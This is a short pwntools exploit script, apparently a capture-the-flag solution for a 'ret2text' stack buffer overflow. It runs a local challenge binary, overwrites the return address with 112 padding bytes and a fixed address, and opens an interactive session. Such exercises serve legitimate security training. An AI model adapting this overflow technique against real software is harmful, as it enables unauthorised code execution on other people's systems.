from pwn import *

io = process("./ret2text")

context.log_level = 'debug'

payload = b'a'*(112)+p32(0x0804863A)

io.recvuntil(b'anything?')
io.sendline(payload)

io.interactive()